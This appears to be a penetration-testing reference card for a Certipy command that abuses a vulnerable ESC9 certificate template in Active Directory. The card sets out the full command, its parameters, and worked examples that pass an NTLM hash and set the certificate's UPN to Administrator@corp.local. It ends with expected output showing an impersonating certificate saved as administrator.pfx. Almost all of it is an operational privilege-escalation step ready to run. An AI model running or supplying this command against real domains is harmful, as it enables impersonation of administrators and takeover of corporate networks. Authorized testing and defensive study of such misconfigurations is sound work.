---
type: command
executor: bash
data: >-
  certipy req -username $_USERNAME -hashes $_HASHES -ca $_CA_NAME -template ESC9
  -upn $_IMPERSONATED_UPN
output: null
platforms:
  - Linux
  - Windows
  - Active Directory
tags:
  - adcs
  - exploitation
verified: true
validated: true
---

# certipy-req-esc9-certificate

## Command

```bash
certipy req -username $_USERNAME -hashes $_HASHES -ca $_CA_NAME -template ESC9 -upn $_IMPERSONATED_UPN
```

## Description

Requests a certificate from a vulnerable ESC9 template, setting an arbitrary UPN for impersonation without object SID extension.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -username $_USERNAME | Username to enroll as (e.g., jane@corp.local) | Yes |
| -hashes $_HASHES | NTLM hash for auth (format: lm:nt) | Yes |
| -ca $_CA_NAME | Certificate Authority name (e.g., corp-DC-CA) | Yes |
| -template ESC9 | Vulnerable template name | Yes |
| -upn $_IMPERSONATED_UPN | UPN in cert (e.g., Administrator@corp.local) | No (defaults to user) |

## Examples

### Basic Usage

```bash
certipy req -username jane@corp.local -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -ca corp-DC-CA -template ESC9
```

### Advanced Usage

```bash
certipy req -username jane@corp.local -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -ca corp-DC-CA -template ESC9 -upn Administrator@corp.local -pfx-output administrator.pfx
```

## Expected Output

Certificate issued:

Certificate saved to administrator.pfx
UserPrincipalName: Administrator@corp.local
No object SID extension present

## Related

- [[procedures/Active-Directory-Certificate-Services-ESC9-Attack]]
- [[tools/Certipy]]
